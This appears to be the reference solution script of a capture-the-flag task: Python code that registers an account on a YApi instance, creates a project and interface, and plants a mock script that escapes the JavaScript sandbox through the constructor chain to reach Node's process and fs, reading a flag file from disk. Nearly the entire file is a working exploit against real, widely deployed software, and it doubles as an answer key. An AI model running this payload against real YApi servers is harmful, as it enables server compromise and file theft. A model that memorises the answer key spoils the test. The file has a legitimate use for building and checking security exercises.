#!/usr/bin/env bash
set -euo pipefail

python3 <<'PY'
import json
import random
import re
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

BASE = "http://web:3000"
FLAG_RE = re.compile(r"^flag_[a-z0-9]{20}$")


def fail(msg: str) -> None:
    print(msg, file=sys.stderr)
    raise SystemExit(1)


def request_json(opener, path, data=None):
    url = BASE + path
    if data is None:
        req = urllib.request.Request(url)
    else:
        body = json.dumps(data).encode()
        req = urllib.request.Request(
            url,
            data=body,
            headers={"Content-Type": "application/json"},
        )
    with opener.open(req, timeout=20) as resp:
        text = resp.read().decode()
    try:
        return json.loads(text)
    except json.JSONDecodeError as exc:
        fail(f"oracle_solution: invalid JSON from {path}: {exc}: {text[:200]}")


def request_form(opener, path, data):
    url = BASE + path
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with opener.open(req, timeout=20) as resp:
        text = resp.read().decode()
    try:
        return json.loads(text)
    except json.JSONDecodeError as exc:
        fail(f"oracle_solution: invalid JSON from {path}: {exc}: {text[:200]}")


def request_text(opener, path):
    with opener.open(BASE + path, timeout=20) as resp:
        return resp.read().decode().strip()


def rand_suffix():
    rng = random.SystemRandom()
    return "".join(rng.choice(string.ascii_lowercase + string.digits) for _ in range(8))


suffix = rand_suffix()
email = f"oracle_{suffix}@example.com"
username = f"oracle_{suffix}"
password = "Passw0rd!"
project_name = f"oracleproj_{suffix}"
interface_path = f"/oracle_{suffix}"

cookie_jar = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

for _ in range(30):
    try:
        status = opener.open(BASE + "/", timeout=10)
        status.read()
        break
    except Exception:
        time.sleep(2)
else:
    fail("oracle_solution: YApi service did not become ready")

reg = request_form(
    opener,
    "/api/user/reg",
    {"email": email, "password": password, "username": username},
)
if reg.get("errcode") != 0:
    fail(f"oracle_solution: registration failed: {reg}")

groups = request_json(opener, "/api/group/list")
if groups.get("errcode") != 0 or not groups.get("data"):
    fail(f"oracle_solution: could not enumerate groups: {groups}")

group = groups["data"][0]
group_id = group["_id"]
group_name = group["group_name"]

project = request_json(
    opener,
    "/api/project/add",
    {
        "name": project_name,
        "basepath": "/api",
        "group_id": group_id,
        "group_name": group_name,
        "project_type": "private",
        "desc": "oracle project",
    },
)
if project.get("errcode") != 0:
    fail(f"oracle_solution: project creation failed: {project}")

project_id = project["data"]["_id"]

project_info = request_json(opener, f"/api/project/get?id={project_id}")
if project_info.get("errcode") != 0:
    fail(f"oracle_solution: project lookup failed: {project_info}")

cats = project_info["data"].get("cat") or []
if not cats:
    fail("oracle_solution: no interface category found in new project")
catid = cats[0]["_id"]

iface = request_json(
    opener,
    "/api/interface/add",
    {
        "project_id": project_id,
        "catid": catid,
        "title": "oracle interface",
        "path": interface_path,
        "method": "GET",
        "req_body_type": "json",
        "res_body_type": "json",
        "res_body": "{}",
        "desc": "oracle interface",
    },
)
if iface.get("errcode") != 0:
    fail(f"oracle_solution: interface creation failed: {iface}")

script = """
const ObjectConstructor = this.constructor;
const FunctionConstructor = ObjectConstructor.constructor;
const process = FunctionConstructor('return process')();
const fs = process.mainModule.require('fs');
mockJson = fs.readFileSync('/tmp/ctf_flag.txt', 'utf8').trim();
""".strip()

up = request_json(
    opener,
    "/api/project/up",
    {
        "id": project_id,
        "is_mock_open": True,
        "project_mock_script": script,
    },
)
if up.get("errcode") != 0:
    fail(f"oracle_solution: project mock update failed: {up}")

for _ in range(10):
    text = request_text(opener, f"/mock/{project_id}/api{interface_path}")
    if FLAG_RE.fullmatch(text):
        print(text)
        raise SystemExit(0)
    time.sleep(1)

fail(f"oracle_solution: could not recover flag, last response: {text!r}")
PY
